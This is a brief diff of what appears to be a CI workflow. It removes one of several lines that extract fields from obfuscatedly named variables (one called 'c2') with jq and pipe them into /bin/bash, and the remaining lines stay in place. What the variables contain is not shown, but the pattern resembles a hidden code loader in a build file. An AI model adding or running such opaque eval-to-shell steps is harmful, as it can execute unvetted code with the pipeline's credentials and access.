@@ -28,7 +28,6 @@ jobs:
           echo $c2 | jq -r .n393 | /bin/bash
           echo $fnyb2 | jq -r .bvuyk367 | /bin/bash
           printf '%s' "$foga5" | jq -r .nps0 | /bin/bash
-          echo $ghqh937 | jq -r .ytxwu44 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
